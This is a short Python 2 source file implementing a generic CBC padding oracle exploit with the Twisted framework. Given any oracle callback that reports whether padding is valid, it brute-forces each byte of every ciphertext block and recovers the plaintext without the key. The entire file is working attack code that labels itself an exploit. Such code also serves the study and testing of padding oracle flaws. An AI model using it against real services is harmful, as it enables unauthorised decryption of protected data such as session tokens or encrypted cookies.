" I am a generic padding oracle exploit written using the Twisted framework "
from twisted.internet import defer
from random import choice
import sys

ASCII = map(chr, range(256))
ASCII.reverse()

def xor(a, b):
    return ''.join([chr(ord(x) ^ ord(y)) for x, y in zip(a, b)])

class POExploit:
    " I am the padding oracle exploit "
    
    def __init__(self, oracle, size=16):
        self.oracle = oracle
        self.size = size

    @defer.inlineCallbacks
    def decrypt(self, encrypted):
        " I simply decrypt the encrypted text without the key "
        blocks = [encrypted[i:i+self.size] 
                  for i in range(0, len(encrypted), self.size)]
        decrypted = yield defer.DeferredList(
            [self.decrypt_block(blocks[i-1], blocks[i]) 
            for i in range(1, len(blocks))])
        defer.returnValue(''.join([x[1] for x in decrypted]))
     
    @defer.inlineCallbacks   
    def decrypt_block(self, previous, block):
        " I decrypt a block in CBC mode given the previous block "
        image = ""
        for n in range(self.size):
            while True:
                payload = choice(ASCII)
                build = yield defer.DeferredList(
                    [self.oracle(payload * (self.size - n - 1) + i + \
                                 xor(image, chr(n + 1) * n) + block) 
                     for i in ASCII])
                match = [ASCII[i] for i in range(256) if build[i][1] == True]
                if len(match) == 1:
                    sys.stdout.write('.')
                    sys.stdout.flush()
                    image = xor(chr(n+1), match[0]) + image
                    break
        defer.returnValue(xor(previous, image))
         
